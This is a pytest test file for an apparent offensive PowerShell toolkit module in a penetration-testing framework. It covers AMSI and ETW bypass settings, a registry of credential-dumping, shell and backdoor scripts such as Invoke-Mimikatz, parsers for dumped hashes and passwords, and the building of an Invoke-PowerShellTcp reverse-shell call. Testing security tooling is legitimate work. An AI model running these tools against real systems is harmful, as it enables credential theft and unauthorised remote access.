"""
Unit Tests for PowerShell Arsenal Module

Tests for:
- Configuration validation
- Script metadata registry
- Output parsers (credentials, findings)
- Executor command building
- Scanner integration
"""

from datetime import datetime

import pytest

# =============================================================================
# CONFIGURATION TESTS
# =============================================================================


class TestPSArsenalConfig:
    """Tests for PSArsenalConfig and related configuration classes."""

    def test_default_config_creation(self):
        """Test creating config with defaults."""
        from aipt_v2.tools.ps_arsenal import PSArsenalConfig

        config = PSArsenalConfig()

        assert config.bypass_amsi is True
        assert config.bypass_etw is True
        assert config.timeout == 300
        assert config.script_timeout == 120
        assert config.amsi_technique == "reflection"

    def test_config_with_custom_values(self):
        """Test creating config with custom values."""
        from aipt_v2.tools.ps_arsenal import PSArsenalConfig, PSLoadMode

        config = PSArsenalConfig(
            scripts_path="/custom/path",
            load_mode=PSLoadMode.REMOTE_IEX,
            bypass_amsi=False,
            timeout=600,
        )

        assert config.scripts_path == "/custom/path"
        assert config.load_mode == PSLoadMode.REMOTE_IEX
        assert config.bypass_amsi is False
        assert config.timeout == 600

    def test_ps_credentials_from_env(self, monkeypatch):
        """Test PSCredentials loads from environment."""
        from aipt_v2.tools.ps_arsenal import PSCredentials

        monkeypatch.setenv("PS_USERNAME", "testuser")
        monkeypatch.setenv("PS_PASSWORD", "testpass")
        monkeypatch.setenv("PS_DOMAIN", "TESTDOMAIN")

        creds = PSCredentials()

        assert creds.username == "testuser"
        assert creds.password == "testpass"
        assert creds.domain == "TESTDOMAIN"

    def test_ps_credentials_has_credentials(self):
        """Test has_credentials method."""
        from aipt_v2.tools.ps_arsenal import PSCredentials

        # No credentials
        empty_creds = PSCredentials(username="", password="")
        assert empty_creds.has_credentials() is False

        # Password auth
        pwd_creds = PSCredentials(username="user", password="pass")
        assert pwd_creds.has_credentials() is True

        # Hash auth
        hash_creds = PSCredentials(username="user", ntlm_hash="aabbccdd")
        assert hash_creds.has_credentials() is True

    def test_ps_credentials_formatted_user(self):
        """Test get_formatted_user with domain."""
        from aipt_v2.tools.ps_arsenal import PSCredentials

        creds = PSCredentials(username="admin", domain="CORP")
        assert creds.get_formatted_user() == "CORP\\admin"

        creds_no_domain = PSCredentials(username="admin")
        assert creds_no_domain.get_formatted_user() == "admin"

    def test_validate_ps_config_valid(self, tmp_path):
        """Test config validation with valid config."""
        from aipt_v2.tools.ps_arsenal import PSArsenalConfig, validate_ps_config

        # Create a mock scripts directory
        scripts_dir = tmp_path / "ps_arsenal"
        scripts_dir.mkdir()

        config = PSArsenalConfig(scripts_path=str(scripts_dir))
        result = validate_ps_config(config)

        assert result["valid"] is True
        assert len(result["errors"]) == 0

    def test_validate_ps_config_missing_path(self):
        """Test config validation with missing scripts path."""
        from aipt_v2.tools.ps_arsenal import PSArsenalConfig, PSLoadMode, validate_ps_config

        config = PSArsenalConfig(scripts_path="/nonexistent/path", load_mode=PSLoadMode.LOCAL_FILE)
        result = validate_ps_config(config)

        assert result["valid"] is False
        assert any("not found" in err for err in result["errors"])


# =============================================================================
# METADATA TESTS
# =============================================================================


class TestScriptMetadata:
    """Tests for script metadata registry."""

    def test_total_scripts_count(self):
        """Test total number of registered scripts."""
        from aipt_v2.tools.ps_arsenal import SCRIPT_METADATA, TOTAL_SCRIPTS

        assert len(SCRIPT_METADATA) == TOTAL_SCRIPTS
        assert len(SCRIPT_METADATA) == 86  # 86 scripts total

    def test_get_script_metadata_existing(self):
        """Test getting metadata for existing script."""
        from aipt_v2.tools.ps_arsenal import get_script_metadata

        metadata = get_script_metadata("Invoke-Mimikatz")

        assert metadata is not None
        assert metadata.name == "Invoke-Mimikatz"
        assert metadata.function_name == "Invoke-Mimikatz"
        assert "T1003.001" in metadata.mitre_techniques

    def test_get_script_metadata_nonexistent(self):
        """Test getting metadata for non-existent script."""
        from aipt_v2.tools.ps_arsenal import get_script_metadata

        metadata = get_script_metadata("NonExistentScript")

        assert metadata is None

    def test_get_scripts_by_category(self):
        """Test filtering scripts by category."""
        from aipt_v2.tools.ps_arsenal import ScriptCategory, get_scripts_by_category

        gather_scripts = get_scripts_by_category(ScriptCategory.GATHER)

        assert len(gather_scripts) == 18
        assert all(s.category == ScriptCategory.GATHER for s in gather_scripts)

    def test_get_credential_scripts(self):
        """Test getting credential-output scripts."""
        from aipt_v2.tools.ps_arsenal import OutputType, get_credential_scripts

        cred_scripts = get_credential_scripts()

        assert len(cred_scripts) > 0
        assert all(s.output_type == OutputType.CREDENTIALS for s in cred_scripts)
        # Verify known credential scripts
        names = [s.name for s in cred_scripts]
        assert "Invoke-Mimikatz" in names
        assert "Get-PassHashes" in names

    def test_get_shell_scripts(self):
        """Test getting shell-output scripts."""
        from aipt_v2.tools.ps_arsenal import OutputType, get_shell_scripts

        shell_scripts = get_shell_scripts()

        # Scripts with shell output type (includes shells + some backdoors)
        assert len(shell_scripts) >= 15  # At least 15 shell scripts
        assert all(s.output_type == OutputType.SHELL for s in shell_scripts)

    def test_get_admin_scripts(self):
        """Test getting admin-required scripts."""
        from aipt_v2.tools.ps_arsenal import RequiredPrivilege, get_admin_scripts

        admin_scripts = get_admin_scripts()

        assert len(admin_scripts) > 0
        for script in admin_scripts:
            assert script.required_privilege in [RequiredPrivilege.ADMIN, RequiredPrivilege.SYSTEM]

    def test_get_category_counts(self):
        """Test category count summary."""
        from aipt_v2.tools.ps_arsenal import get_category_counts

        counts = get_category_counts()

        assert counts["Gather"] == 18
        assert counts["Shells"] == 15
        assert counts["Utility"] == 15
        assert sum(counts.values()) == 86  # 86 scripts total

    def test_list_scripts(self):
        """Test list_scripts convenience function."""
        from aipt_v2.tools.ps_arsenal import list_scripts

        scripts = list_scripts()

        assert "Gather" in scripts
        assert "Shells" in scripts
        assert len(scripts["Gather"]) == 18

    def test_get_script_info(self):
        """Test get_script_info convenience function."""
        from aipt_v2.tools.ps_arsenal import get_script_info

        info = get_script_info("Get-Information")

        assert info["name"] == "Get-Information"
        assert info["category"] == "Gather"
        assert info["required_privilege"] == "user"
        assert "T1082" in info["mitre_techniques"]

    def test_mitre_technique_coverage(self):
        """Test that scripts have MITRE ATT&CK mappings."""
        from aipt_v2.tools.ps_arsenal import SCRIPT_METADATA

        scripts_with_mitre = [s for s in SCRIPT_METADATA.values() if len(s.mitre_techniques) > 0]

        # Most scripts should have MITRE mappings
        assert len(scripts_with_mitre) >= 80


# =============================================================================
# PARSER TESTS
# =============================================================================


class TestPSArsenalParser:
    """Tests for output parsers."""

    def test_parse_get_passhashes(self):
        """Test parsing Get-PassHashes output."""
        from aipt_v2.tools.ps_arsenal import PSArsenalParser

        output = """
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
TestUser:1001:aad3b435b51404eeaad3b435b51404ee:a1b2c3d4e5f67890a1b2c3d4e5f67890:::
"""

        parser = PSArsenalParser()
        findings, credentials = parser.parse_get_passhashes(output)

        assert len(credentials) == 3
        assert credentials[0].username == "Administrator"
        assert credentials[0].ntlm_hash == "31d6cfe0d16ae931b73c59d7e0c089c0"
        assert credentials[0].credential_type == "hash"

        assert len(findings) == 3
        assert all(f.severity.value == "critical" for f in findings)

    def test_parse_get_wlan_keys(self):
        """Test parsing Get-WLAN-Keys output."""
        from aipt_v2.tools.ps_arsenal import PSArsenalParser

        output = """
SSID 1 : HomeNetwork
Key Content : MySecretPassword123

SSID 2 : GuestNetwork
Key Content : guest1234
"""

        parser = PSArsenalParser()
        findings, credentials = parser.parse_get_wlan_keys(output)

        assert len(credentials) == 2
        assert credentials[0].username == "HomeNetwork"
        assert credentials[0].password == "MySecretPassword123"
        assert credentials[0].credential_type == "wlan"

    def test_parse_invoke_mimikatz(self):
        """Test parsing Invoke-Mimikatz output."""
        from aipt_v2.tools.ps_arsenal import PSArsenalParser

        output = """
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 12345 (00000000:00003039)
Session           : Interactive
User Name         : Administrator
Domain            : CORP
Logon Server      : DC01
Logon Time        : 1/1/2024 12:00:00 AM

         * Username : Administrator
         * Domain   : CORP
         * NTLM     : aabbccdd11223344aabbccdd11223344
         * SHA1     : 1122334455667788990011223344556677889900

         * Username : ServiceAccount
         * Domain   : CORP
         * Password : P@ssw0rd123!
"""

        parser = PSArsenalParser()
        findings, credentials = parser.parse_invoke_mimikatz(output)

        assert len(credentials) >= 1
        # First credential should have NTLM hash
        admin_cred = next((c for c in credentials if c.username == "Administrator"), None)
        assert admin_cred is not None
        assert admin_cred.ntlm_hash == "aabbccdd11223344aabbccdd11223344"

        # Service account should have password
        svc_cred = next((c for c in credentials if c.username == "ServiceAccount"), None)
        assert svc_cred is not None
        assert svc_cred.password == "P@ssw0rd123!"
        assert svc_cred.credential_type == "plaintext"

    def test_parse_check_vm(self):
        """Test parsing Check-VM output."""
        from aipt_v2.tools.ps_arsenal import PSArsenalParser

        # VMware detected
        parser = PSArsenalParser()
        findings = parser.parse_check_vm("VMware Virtual Platform detected")

        assert len(findings) == 1
        assert "VMware" in findings[0].title
        assert findings[0].severity.value == "info"

    def test_parse_get_information(self):
        """Test parsing Get-Information output."""
        from aipt_v2.tools.ps_arsenal import PSArsenalParser

        output = """
OS Name: Microsoft Windows Server 2019
OS Version: 10.0.17763
Computer Name: DC01
Domain: corp.local
Current User: CORP\\Administrator
Logon Server: \\\\DC01
"""

        parser = PSArsenalParser()
        findings = parser.parse_get_information(output)

        assert len(findings) == 1
        assert "DC01" in findings[0].description
        assert findings[0].metadata.get("computer_name") == "DC01"
        assert findings[0].metadata.get("domain") == "corp.local"

    def test_parse_all_routes_correctly(self):
        """Test parse_all routes to correct parser."""
        from aipt_v2.tools.ps_arsenal import PSArsenalParser

        parser = PSArsenalParser()

        # Test routing to Get-PassHashes parser
        findings, creds = parser.parse_all(
            "test:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::",
            "Get-PassHashes",
        )
        assert len(creds) == 1

    def test_parse_web_credentials(self):
        """Test parsing Get-WebCredentials output."""
        from aipt_v2.tools.ps_arsenal import PSArsenalParser

        output = """
URL: https://example.com
Username: admin@example.com
Password: SecretPass123

URL: https://github.com
Username: developer
Password: gh_token_abc123
"""

        parser = PSArsenalParser()
        findings, credentials = parser.parse_web_credentials(output)

        assert len(credentials) == 2
        assert credentials[0].username == "admin@example.com"
        assert credentials[0].metadata.get("url") == "https://example.com"


# =============================================================================
# EXECUTOR TESTS
# =============================================================================


class TestPSArsenalExecutor:
    """Tests for PSArsenalExecutor."""

    def test_build_function_call_no_params(self):
        """Test building function call without parameters."""
        from aipt_v2.tools.ps_arsenal.ps_executor import PSArsenalExecutor

        executor = PSArsenalExecutor(scripts_path="/tmp/test")
        result = executor._build_function_call("Get-Information", None)

        assert result == "Get-Information"

    def test_build_function_call_with_params(self):
        """Test building function call with various parameter types."""
        from aipt_v2.tools.ps_arsenal.ps_executor import PSArsenalExecutor

        executor = PSArsenalExecutor(scripts_path="/tmp/test")

        params = {
            "IPAddress": "192.168.1.1",
            "Port": 4444,
            "Reverse": True,
            "Verbose": False,
        }

        result = executor._build_function_call("Invoke-PowerShellTcp", params)

        assert "Invoke-PowerShellTcp" in result
        assert "-IPAddress '192.168.1.1'" in result
        assert "-Port 4444" in result
        assert "-Reverse" in result
        assert "-Verbose" not in result  # False booleans not included

    def test_build_function_call_escapes_quotes(self):
        """Test that single quotes in parameters are escaped."""
        from aipt_v2.tools.ps_arsenal.ps_executor import PSArsenalExecutor

        executor = PSArsenalExecutor(scripts_path="/tmp/test")

        params = {"Command": "sekurlsa::logonpasswords 'test'"}
        result = executor._build_function_call("Invoke-Mimikatz", params)

        # Single quotes should be doubled for PowerShell escaping
        assert "''" in result

    def test_get_script_url(self):
        """Test remote script URL generation."""
        from aipt_v2.tools.ps_arsenal.ps_executor import PSArsenalExecutor

        executor = PSArsenalExecutor(base_url="https://raw.githubusercontent.com/test/repo/master")

        url = executor._get_script_url("Gather", "Invoke-Mimikatz")

        assert (
            url == "https://raw.githubusercontent.com/test/repo/master/Gather/Invoke-Mimikatz.ps1"
        )

    def test_amsi_bypass_techniques_available(self):
        """Test AMSI bypass techniques are defined."""
        from aipt_v2.tools.ps_arsenal import AMSI_BYPASS_TECHNIQUES

        assert "reflection" in AMSI_BYPASS_TECHNIQUES
        assert "memory_patch" in AMSI_BYPASS_TECHNIQUES
        assert "string_concat" in AMSI_BYPASS_TECHNIQUES

        # Each technique should be a non-empty string
        for name, code in AMSI_BYPASS_TECHNIQUES.items():
            assert len(code) > 0
            assert "try" in code.lower() or "catch" in code.lower()


# =============================================================================
# SCANNER TESTS
# =============================================================================


class TestPSArsenalScanner:
    """Tests for PSArsenalScanner integration."""

    def test_scanner_creation(self):
        """Test scanner instantiation."""
        from aipt_v2.tools.ps_arsenal import PSArsenalScanner, PSScanConfig

        config = PSScanConfig(scripts_path="/tmp/test")
        scanner = PSArsenalScanner(config)

        assert scanner.config.scripts_path == "/tmp/test"

    def test_scanner_severity_conversion(self):
        """Test severity level conversion."""
        from aipt_v2.tools.ps_arsenal import PSArsenalScanner, PSFindingSeverity

        scanner = PSArsenalScanner()

        assert scanner._convert_severity(PSFindingSeverity.CRITICAL) == "critical"
        assert scanner._convert_severity(PSFindingSeverity.HIGH) == "high"
        assert scanner._convert_severity(PSFindingSeverity.MEDIUM) == "medium"
        assert scanner._convert_severity(PSFindingSeverity.LOW) == "low"
        assert scanner._convert_severity(PSFindingSeverity.INFO) == "info"

    def test_scan_result_to_dict(self):
        """Test ScanResult serialization."""
        from datetime import timezone

        from aipt_v2.tools.ps_arsenal.ps_scanner import ScanFinding, ScanResult

        result = ScanResult(scanner="ps_arsenal", target="localhost", status="completed")
        result.start_time = datetime.now(timezone.utc)
        result.end_time = datetime.now(timezone.utc)
        result.findings.append(
            ScanFinding(title="Test Finding", severity="high", description="Test description")
        )

        data = result.to_dict()

        assert data["scanner"] == "ps_arsenal"
        assert data["target"] == "localhost"
        assert data["status"] == "completed"
        assert data["findings_count"] == 1


# =============================================================================
# ATTACKS ORCHESTRATOR TESTS
# =============================================================================


class TestPSArsenalAttacks:
    """Tests for PSArsenalAttacks orchestrator."""

    def test_attack_result_properties(self):
        """Test AttackResult property methods."""
        from aipt_v2.tools.ps_arsenal import AttackResult
        from aipt_v2.tools.ps_arsenal.ps_parsers import (
            PSFinding,
            PSFindingCategory,
            PSFindingSeverity,
        )

        result = AttackResult(
            success=True,
            attack_name="test_attack",
            scripts_executed=["Script1", "Script2"],
            findings=[
                PSFinding(
                    title="Critical Issue",
                    category=PSFindingCategory.CREDENTIAL,
                    severity=PSFindingSeverity.CRITICAL,
                    description="Test",
                    source_script="Script1",
                ),
                PSFinding(
                    title="High Issue",
                    category=PSFindingCategory.HASH,
                    severity=PSFindingSeverity.HIGH,
                    description="Test",
                    source_script="Script2",
                ),
            ],
        )

        assert len(result.critical_findings) == 1
        assert len(result.high_findings) == 1

    def test_attack_result_to_dict(self):
        """Test AttackResult serialization."""
        from aipt_v2.tools.ps_arsenal import AttackResult

        result = AttackResult(
            success=True,
            attack_name="gather_credentials",
            scripts_executed=["Invoke-Mimikatz"],
            errors=[],
        )

        data = result.to_dict()

        assert data["success"] is True
        assert data["attack_name"] == "gather_credentials"
        assert "timestamp" in data


# =============================================================================
# INTEGRATION TESTS
# =============================================================================


class TestToolRegistryIntegration:
    """Tests for ToolRegistry integration."""

    def test_ps_arsenal_tools_registered(self):
        """Test that PS Arsenal tools are in ToolRegistry."""
        from aipt_v2.execution.tool_registry import TOOL_REGISTRY

        ps_tools = [k for k in TOOL_REGISTRY.keys() if k.startswith("ps-arsenal")]

        assert len(ps_tools) >= 8
        assert "ps-arsenal-creds" in ps_tools
        assert "ps-arsenal-shell" in ps_tools
        assert "ps-arsenal-recon" in ps_tools
        assert "ps-arsenal-scanner" in ps_tools

    def test_ps_capabilities_defined(self):
        """Test that PS capabilities are in ToolCapability enum."""
        from aipt_v2.execution.tool_registry import ToolCapability

        assert hasattr(ToolCapability, "PS_CREDENTIAL_DUMP")
        assert hasattr(ToolCapability, "PS_SHELL")
        assert hasattr(ToolCapability, "PS_PERSISTENCE")
        assert hasattr(ToolCapability, "PS_RECON")
        assert hasattr(ToolCapability, "PS_ESCALATION")

    def test_ps_arsenal_tool_capabilities(self):
        """Test PS Arsenal tool capabilities are correctly assigned."""
        from aipt_v2.execution.tool_registry import TOOL_REGISTRY, ToolCapability

        creds_tool = TOOL_REGISTRY["ps-arsenal-creds"]
        assert ToolCapability.PS_CREDENTIAL_DUMP in creds_tool.capabilities

        shell_tool = TOOL_REGISTRY["ps-arsenal-shell"]
        assert ToolCapability.PS_SHELL in shell_tool.capabilities


# =============================================================================
# FIXTURE DEFINITIONS
# =============================================================================


@pytest.fixture
def mock_powershell_result():
    """Create a mock PowerShellResult."""
    from aipt_v2.tools.winpwn.powershell_executor import PowerShellResult

    return PowerShellResult(
        success=True,
        exit_code=0,
        stdout="Test output",
        stderr="",
        execution_time=1.5,
        command="test command",
    )


@pytest.fixture
def sample_mimikatz_output():
    """Sample Mimikatz output for testing."""
    return """
mimikatz # sekurlsa::logonpasswords

Authentication Id : 0 ; 999 (00000000:000003e7)
Session           : UndefinedLogonType
User Name         : SYSTEM
Domain            : NT AUTHORITY

         * Username : Administrator
         * Domain   : TESTDOMAIN
         * NTLM     : 31d6cfe0d16ae931b73c59d7e0c089c0
         * SHA1     : da39a3ee5e6b4b0d3255bfef95601890afd80709
"""


@pytest.fixture
def sample_passhashes_output():
    """Sample Get-PassHashes output for testing."""
    return """
Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
"""
